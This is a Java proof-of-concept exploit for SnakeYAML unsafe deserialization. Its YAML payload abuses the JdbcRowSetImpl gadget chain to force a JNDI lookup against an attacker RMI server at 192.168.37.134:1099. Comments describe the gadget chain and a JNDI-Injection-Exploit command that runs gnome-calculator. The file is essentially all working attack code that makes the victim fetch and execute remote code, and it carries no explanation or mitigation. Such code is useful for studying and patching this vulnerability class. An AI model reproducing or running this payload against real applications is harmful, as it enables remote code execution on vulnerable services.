package JdbcRowSetImplEXP;

import com.sun.rowset.JdbcRowSetImpl;
import org.yaml.snakeyaml.Yaml;

public class Exp2 {
    public static void main(String[] args) throws Exception {
        /*
        Gadget chain:
        JdbcRowSetImpl#setAutoCommit
	        JdbcRowSetImpl#connect
		        InitialContext#lookup
         */
        // use JNDI-Injection-Exploit
        // java -jar xxx.jar -C "/usr/bin/gnome-calculator"
        String payload = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"rmi://192.168.37.134:1099/jsahth\", autoCommit: true}";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
